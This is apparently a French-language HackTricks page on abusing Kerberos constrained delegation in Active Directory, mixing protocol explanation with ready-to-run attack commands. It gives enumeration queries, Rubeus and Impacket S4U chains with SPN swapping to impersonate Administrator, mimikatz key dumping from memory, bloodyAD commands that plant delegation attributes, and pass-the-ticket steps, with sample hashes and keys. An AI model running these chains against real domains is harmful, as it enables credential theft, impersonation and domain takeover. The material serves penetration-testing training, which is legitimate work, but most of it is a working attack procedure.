# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Grâce à cela, un Domain admin peut **autoriser** un ordinateur à **usurper l'identité d'un utilisateur ou d'un ordinateur** auprès de n'importe quel **service** d'une machine.

- **Service for User to self (_S4U2self_) :** Tout **service account qui possède un SPN** peut généralement obtenir un TGS pour lui-même au nom d'un utilisateur arbitraire. Si le compte possède également [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) dans _userAccountControl_, ce TGS est **forwardable**, ce qui rend le protocol transition directement utile pour la **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_) :** Un **service account** peut obtenir un TGS au nom d'un utilisateur vers les SPN listés dans **msDS-AllowedToDelegateTo**. Le ticket de preuve utilisé dans S4U2Proxy doit être un ticket **forwardable** vers le service délégant : soit un véritable ticket client-service capturé depuis la victime, soit un ticket généré avec **S4U2Self + T2A4D**.

**Note** : Si un utilisateur est marqué comme ‘_Account is sensitive and cannot be delegated_’ dans AD, ou s'il est membre de **Protected Users**, vous ne pourrez généralement **pas usurper son identité** via la constrained delegation. Dans les domaines modernes, préférez le matériel **AES** aux hypothèses limitées à RC4 lors du ciblage de comptes activés pour la delegation.

Cela signifie que si vous **compromettez le hash du service**, vous pouvez **usurper l'identité d'utilisateurs** et obtenir un **accès** en leur nom à n'importe quel **service** sur les machines indiquées (possible **privesc**).

De plus, vous n'aurez **pas seulement accès au service que l'utilisateur peut usurper, mais également à n'importe quel service**, car le SPN (le nom du service demandé) n'est pas vérifié (dans le ticket, cette partie n'est pas chiffrée/signée). Par conséquent, si vous avez accès au **service CIFS**, vous pouvez également avoir accès au **service HOST** en utilisant par exemple le flag `/altservice` dans Rubeus. La même faiblesse de substitution de SPN est exploitée par **Impacket getST -altservice** et d'autres outils.

De plus, **l'accès au service LDAP sur un DC** est nécessaire pour exploiter un **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Note pour l’opérateur :** ne faites pas confiance aux seules captures d’écran d’**ADUC** ou de BloodHound pour l’examen des comptes **gMSA/sMSA**. Ces comptes masquent souvent l’onglet Delegation habituel ; énumérez donc directement les attributs bruts **`userAccountControl`** et **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

Si le compte compromis possède **T2A4D**, vous pouvez généralement effectuer toute la chaîne **`S4U2Self -> S4U2Proxy`** uniquement avec la clé de service/le TGT.<sup>[[2]](#references)</sup>

S'il possède uniquement **`msDS-AllowedToDelegateTo`** (le mode classique **"Use Kerberos only"**), la delegation reste exploitable, mais le ticket de preuve pour S4U2Proxy doit être un **véritable ticket user-to-service forwardable** pour le service délégant. En pratique, cela signifie voler ou capturer un TGS de victime depuis **LSASS/ccache** et l'utiliser lors de la seconde étape (`/tgs:` dans Rubeus). Un ticket S4U2Self **non-forwardable** ne suffit pas pour la constrained delegation classique ; si c'est votre seul ticket de preuve, consultez plutôt [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Notes sur la constrained delegation inter-domaines (2025+)

Depuis **Windows Server 2012/2012 R2**, le KDC prend en charge la constrained delegation entre domaines/forêts via les extensions S4U2Proxy. Les versions modernes (Windows Server 2016–2025) conservent ce comportement et ajoutent deux SID PAC pour signaler la protocol transition :<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) lorsque l'utilisateur s'est authentifié normalement.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) lorsqu'un service a revendiqué l'identité via la protocol transition.

Attendez-vous à trouver `SERVICE_ASSERTED_IDENTITY` dans le PAC lorsque la protocol transition est utilisée entre domaines, ce qui confirme que l'étape S4U2Proxy a réussi.<sup>[[1]](#references)</sup>

### Outils Impacket / Linux (altservice & full S4U)

Les versions récentes d'Impacket (0.11.x+) exposent la même chaîne S4U et le même SPN swapping que Rubeus :<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Si vous préférez forger d’abord le ST utilisateur (par ex. avec uniquement un hash hors ligne), associez **ticketer.py** à **getST.py** pour S4U2Proxy. `tgssub.py` est également pratique lorsque vous disposez déjà d’un ccache fonctionnel et que vous devez uniquement remplacer la classe de service pour le même hôte. Consultez l’issue Impacket ouverte #1713 pour connaître les problèmes actuels (KRB_AP_ERR_MODIFIED lorsque le ST forgé ne correspond pas à la clé SPN).<sup>[[2]](#references)</sup>

### Automatisation de la configuration de la delegation avec des credentials à faibles privilèges

Si vous disposez déjà de **GenericAll/WriteDACL** sur un compte ordinateur ou un compte de service, vous pouvez appliquer à distance les attributs requis sans RSAT avec **bloodyAD** (2024+) :
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Cela vous permet de créer un chemin de délégation contrainte pour la privesc sans privilèges DA dès que vous pouvez écrire ces attributs.

- Étape 1 : **Obtenir le TGT du service autorisé**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Il existe **d'autres moyens d'obtenir un ticket TGT** ou le **RC4** ou **AES256** sans être SYSTEM sur l'ordinateur, comme le Printer Bug et unconstrain delegation, le NTLM relaying et l'abus d'Active Directory Certificate Service
>
> **Le simple fait de posséder ce ticket TGT (ou son hash) permet d'effectuer cette attaque sans compromettre l'ensemble de l'ordinateur.**

- Étape 2 : **Obtenir un TGS pour le service en usurpant l'utilisateur**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Plus d’informations sur ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) et [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## Références

- [1] [Présentation de la délégation contrainte Kerberos (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abus de la délégation avec Impacket (Partie 2) : délégation contrainte (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Délégation contrainte Kerberos (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity a tué le domaine : une vue d’ensemble offensive de Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

{{#include ../../banners/hacktricks-training.md}}
